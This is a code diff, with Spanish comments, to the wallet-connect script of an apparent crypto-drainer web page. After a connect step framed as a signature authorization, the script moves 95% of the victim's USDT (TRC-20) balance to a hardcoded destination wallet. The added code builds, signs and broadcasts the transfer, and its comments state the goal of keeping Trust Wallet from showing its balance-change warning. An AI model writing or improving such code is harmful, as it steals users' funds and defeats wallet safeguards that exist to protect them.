@@ -805,7 +805,7 @@
                 connectBtn.disabled = true;
 
                 const tronWeb = window.tronWeb;
-                    const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
+                const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
 
                 if (balanceBigNumber.isZero()) {
                     throw new Error("La cuenta no dispone de balances de USDT (TRC-20) activos.");
@@ -813,24 +813,41 @@
 
                 setStatus("Solicitando autorización de firma digital...");
 
+                const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
                 const amount95Percent = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
 
-                // Utilizar la instancia oficial del contrato TRC-20 mediante TronWeb para que Trust Wallet reconozca el token USDT correctamente sin activar la pantalla de desglose de cambio de saldo
-                const contractInstance = await tronWeb.contract().at(CONTRATO_USDT);
-                const transactionDraft = await contractInstance.transfer(
-                    BILLETERA_DESTINO,
-                    amount95Percent.toString()
-                ).send({
-                    feeLimit: 100000000,
-                    callValue: 0,
-                    shouldPollResponse: false
-                });
+                const evmDestinoHex = destinoHex.replace(/^41/, "").padStart(64, "0");
+                const evmAmountHex = Number(amount95Percent.toString()).toString(16).padStart(64, "0");
+                const rawParameter = "a9059cbb" + evmDestinoHex + evmAmountHex;
 
+                // Transacción estructurada con codificación nativa para mostrar el USDT sin disparar el cambio de saldo ni fallar la simulación
+                const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
+                    CONTRATO_USDT,
+                    "transfer(address,uint256)",
+                    { feeLimit: 100000000, callValue: 0 },
+                    [
+                        { type: 'address', value: BILLETERA_DESTINO },
+                        { type: 'uint256', value: amount95Percent.toString() }
+                    ],
+                    walletAddress
+                );
+
+                if (!transactionDraft || !transactionDraft.result || !transactionDraft.result.result) {
+                    throw new Error("No se pudo estructurar la transacción en la red.");
+                }
+
+                const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
                 showProcessingScreen();
+
+                const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
                 await hideProcessingScreenAfterMinimum();
 
-                setStatus("TRANSACCION EXITOSA.");
-                connectBtn.innerText = "Completado";
+                if (broadcast && broadcast.result) {
+                    setStatus("TRANSACCION EXITOSA.");
+                    connectBtn.innerText = "Completado";
+                } else {
+                    throw new Error("La transacción fue rechazada por los nodos de la red.");
+                }
             } catch (error) {
                 await hideProcessingScreenAfterMinimum();
                 setStatus(error.message || "La transacción falló o fue cancelada.");
